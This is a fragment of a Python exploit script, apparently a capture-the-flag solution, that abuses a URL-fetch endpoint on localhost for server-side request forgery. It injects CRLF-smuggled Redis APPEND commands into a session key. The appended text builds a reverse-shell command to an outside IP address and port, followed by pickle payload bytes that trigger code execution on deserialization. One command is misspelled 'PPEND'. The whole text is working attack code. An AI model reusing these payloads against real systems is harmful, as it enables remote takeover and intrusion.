...
url_post = 'http://redis:6379/?q=HTTP/1.1%0D%0AAPPEND "session:8b84b3c7-34eb-4fcf-ab79-3ae9e44f52ee" "bash -c \'bash -i >& "%0D%0AHeader2: THIS_IS_MY_HEADER_2%0D%0A'
...
url_post = 'http://redis:6379/?q=HTTP/1.1%0D%0APPEND "session:8b84b3c7-34eb-4fcf-ab79-3ae9e44f52ee" "/dev/tcp/140.112.90.24/9527 0>&1\'"%0D%0AHeader2: THIS_IS_MY_HEADER_2%0D%0A'
print(url_post)
r = requests.post('https://localhost:10163', data={'url': url_post}, verify=False)
print(r.status_code, r.text)
requests.get(r.text, verify=False)

url_post = 'http://redis:6379/?q=HTTP/1.1%0D%0AAPPEND "session:8b84b3c7-34eb-4fcf-ab79-3ae9e44f52ee" "q\x01\x85q\x02Rq\x03."%0D%0AHeader2: THIS_IS_MY_HEADER_2%0D%0A'
print(url_post)
r = requests.post('https://localhost:10163', data={'url': url_post}, verify=False)
print(r.status_code, r.text)
requests.get(r.text, verify=False)
